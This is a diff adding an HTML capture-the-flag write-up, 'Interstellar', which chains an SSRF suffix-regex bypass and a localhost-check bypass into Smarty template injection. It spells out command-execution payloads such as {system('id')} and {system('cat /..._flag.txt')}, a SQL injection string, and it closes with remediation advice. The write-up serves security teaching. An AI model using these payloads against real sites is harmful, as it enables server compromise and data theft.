+                            <td><code>{system('ls')}</code></td>
+                            <td><code>systemls</code></td>
+                            <td>Sanitizer stripped <code>{</code>, <code>}</code>, <code>(</code>, <code>)</code>,
+                                <code>'</code>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><code>{$smarty.version}</code></td>
+                            <td><code>{$smarty.version}</code> (literal)</td>
+                            <td>Direct name change blocked — "Only localhost!"</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <p><strong>These all failed because registration sanitizes the name.</strong> The SSRF-based edit
+                    endpoint is the correct path.</p>
+
+                <h3>Achieving Smarty SSTI via SSRF</h3>
+
+                <p>Using the SSRF to set the name through the <strong>unsanitized</strong> edit endpoint:</p>
+
+                <p><strong>Test</strong>: Set name to <code>{7*7}</code>:</p>
+                <pre><code>data[new_name] = {7*7}</code></pre>
+                <p>Navigate to <code>/</code> → Displayed: <strong>"Yo, 49"</strong> → <strong>Smarty is executing
+                        code!</strong></p>
+
+                <p><strong>RCE</strong>: Set name to <code>{system('id')}</code>:</p>
+                <pre><code>data[new_name] = {system('id')}</code></pre>
+                <p>Navigate to <code>/</code> → Displayed: <strong>"Yo, uid=33(www-data) gid=33(www-data)
+                        groups=33(www-data)"</strong></p>
+
+                <h3>Capturing the Flag</h3>
+
+                <p>The flag is at a randomized path (<code>/&lt;hex&gt;_flag.txt</code>). We need to find it first.</p>
+
+                <p><strong>Step 1</strong>: List root directory:</p>
+                <pre><code>data[new_name] = {system('ls /')}</code></pre>
+                <p>→ Reveals: <code>a1b2c3d4e5f6a7b8_flag.txt</code> (example)</p>
+
+                <p><strong>Step 2</strong>: Read the flag:</p>
+                <pre><code>data[new_name] = {system('cat /a1b2c3d4e5f6a7b8_flag.txt')}</code></pre>
+                <p>→ <strong>Flag captured.</strong></p>
+
+                <h2 id="s7">7. Attack Chain Summary</h2>
+
+                <pre><code>┌─────────────────────────────────────────────────────────────────────┐
+│                    INTERSTELLAR EXPLOIT CHAIN                       │
+├──────────┬──────────────────────────────────────────────────────────┤
+│ Step 1   │ Register + Login                                        │
+│          │ Create an account, log in to get a PHPSESSID cookie     │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Step 2   │ SSRF via /communicate.php                               │
+│          │ URL: http://127.0.0.1.motherland.com/index.php          │
+│          │ Bypasses regex by ending with "motherland.com"           │
+│          │ curl resolves hostname to 127.0.0.1 → hits localhost    │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Step 3   │ Bypass localhost check on name edit                     │
+│          │ SSRF POST arrives with REMOTE_ADDR = 127.0.0.1          │
+│          │ Passes the $_SERVER['REMOTE_ADDR'] != '127.0.0.1' check │
+│          │ Sends data[new_name] and data[action]=edit               │
+├──────────┼──────────────────────────────────────────────────────────┤
+│ Step 4   │ Smarty SSTI → RCE                                      │
+│          │ Name set to {system('ls /')} via SSRF                   │
+│          │ Smarty template renders name → executes system()        │
+│          │ Find randomized flag filename, read it with cat         │
+└──────────┴──────────────────────────────────────────────────────────┘</code></pre>
+
+                <h2 id="s8">8. Why Other Approaches Failed</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>Why It Failed</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Header spoofing</strong> (XFF, X-Real-IP)</td>
+                            <td><code>$_SERVER['REMOTE_ADDR']</code> is set by Apache from the TCP socket, not from HTTP
+                                headers. Cannot be spoofed without a proxy that trusts those headers.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Host header = localhost</strong></td>
+                            <td>Changes what Apache routes, not what <code>REMOTE_ADDR</code> reports.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>SSTI via registration</strong></td>
+                            <td><code>preg_replace('/[^a-zA-Z0-9]/', '', $name)</code> strips all special characters
+                                needed for Smarty syntax (<code>{}</code>, <code>()</code>, <code>$</code>,
+                                <code>'</code>, <code>*</code>).
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><strong>IP obfuscation</strong> (0, 127.1, hex, decimal, octal, IPv6)</td>
+                            <td>The regex <code>/motherland\.com$/</code> checks the <strong>domain name</strong>, not
+                                the IP. No IP format matches <code>motherland.com</code>.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>DNS rebinding / external domains</strong></td>
+                            <td>Server likely had no external DNS resolution; all non-<code>motherland.com</code> hosts
+                                failed the regex anyway.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>file:// and php:// wrappers</strong></td>
+                            <td><code>filter_var($url, FILTER_VALIDATE_URL)</code> rejects non-HTTP schemes.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>URL encoding in hostname</strong></td>
+                            <td><code>filter_var</code> and <code>parse_url</code> reject encoded characters in the host
+                                component.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2 id="s9">9. Bonus: SQL Injection (Alternative Path)</h2>
+
+                <p>The <code>searchUser</code> stored procedure has a <strong>SQL injection</strong> vulnerability:</p>
+
+                <pre><code>CREATE PROCEDURE searchUser(IN name VARCHAR(255))
+BEGIN
+    SET @sql = CONCAT('SELECT * FROM users WHERE name = \'', name, '\'');
+    PREPARE stmt FROM @sql;
+    EXECUTE stmt;
+END</code></pre>
+
+                <p>If the name contains SQL metacharacters (like <code>' OR 1=1 --</code>), the query is injectable.
+                    Since we can set the name to arbitrary values via SSRF, we could potentially:</p>
+                <ol>
+                    <li>Set name to a SQL injection payload</li>
+                    <li>Navigate to <code>/</code> (which calls <code>searchUser</code> with the name)</li>
+                    <li>Extract data from the database</li>
+                </ol>
+
+                <p>However, the database doesn't contain the flag (it's in a file on disk), so this path alone wouldn't
+                    capture the flag — SSTI to RCE is required.</p>
+
+                <h2 id="s10">10. Key Takeaways</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Concept</th>
+                            <th>Lesson</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong><code>REMOTE_ADDR</code> vs headers</strong></td>
+                            <td><code>$_SERVER['REMOTE_ADDR']</code> cannot be spoofed with HTTP headers — it's the TCP
+                                source IP. Only SSRF or a misconfigured reverse proxy can change it.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Allowlist regex bypass</strong></td>
+                            <td><code>preg_match('/motherland\.com$/', ...)</code> can be bypassed with subdomains like
+                                <code>127.0.0.1.motherland.com</code>. Always validate the full domain, not just the
+                                suffix.
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><strong>Sanitization inconsistency</strong></td>
+                            <td>Registration sanitized the name, but the edit endpoint didn't. When the same data flows
+                                through multiple paths, <strong>every path</strong> must sanitize.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Challenge hints in UI text</strong></td>
+                            <td>"Send request to your <strong>mother land</strong>!" directly hints at the
+                                <code>motherland.com</code> regex. Always read the flavor text carefully.
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><strong>Smarty SSTI</strong></td>
+                            <td>Smarty's <code>{system()}</code> tag provides direct OS command execution. Never render
+                                user-controlled data in templates without escaping.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Randomized flag filenames</strong></td>
+                            <td><code>$(openssl rand -hex 8)_flag.txt</code> prevents direct file read — you need
+                                directory listing or a glob first.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2 id="s11">11. Remediation</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Vulnerability</th>
+                            <th>Fix</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>SSRF in <code>communicate.php</code></td>
+                            <td>Don't pass user-controlled URLs to <code>curl_init()</code>. Use a strict allowlist of
+                                <strong>full URLs</strong>, not regex on hostnames.
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><code>REMOTE_ADDR</code> as sole ACL</td>
+                            <td>Use authentication tokens, not IP checks. If IP-based ACL is needed, combine with
+                                network-layer controls.</td>
+                        </tr>
+                        <tr>
+                            <td>Smarty SSTI</td>
+                            <td>Use <code>{$name|escape}</code> in templates. Never render unsanitized user input.</td>
+                        </tr>
+                        <tr>
+                            <td>SQL injection in <code>searchUser</code></td>
+                            <td>Use parameterized queries inside stored procedures (not <code>CONCAT</code> +
+                                <code>PREPARE</code>).
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>Inconsistent sanitization</td>
+                            <td>Apply the same validation rules at the point of use, not at the point of entry. The edit
+                                endpoint should sanitize just like registration.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="pwned-banner">
+                    <span class="pwned-icon">🏴</span>
+                    <div class="pwned-text">Machine Pwned</div>
+                    <p class="pwned-sub">SSRF → SSTI → RCE → Flag captured</p>
+                </div>
+
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Abdelaaziz Belkhair</p>
+        </div>
+    </footer>
+</body>
+
+</html>
